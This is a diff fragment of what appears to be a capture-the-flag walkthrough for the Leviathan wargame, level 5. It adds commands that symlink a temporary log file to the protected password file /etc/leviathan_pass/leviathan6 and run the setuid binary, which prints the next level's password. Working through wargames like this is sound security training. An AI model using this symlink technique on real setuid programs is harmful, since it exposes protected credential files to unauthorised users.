@@ -253,6 +253,9 @@ getuid()                                                                        
 setuid(12005)                                                                                                        = 0
 unlink("/tmp/file.log")                                                                                              = 0
 +++ exited (status 0) +++
+leviathan5@leviathan:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
+leviathan5@leviathan:~$ ./leviathan5
+UgaoFee4li
 leviathan5@leviathan:~$
 
 ```
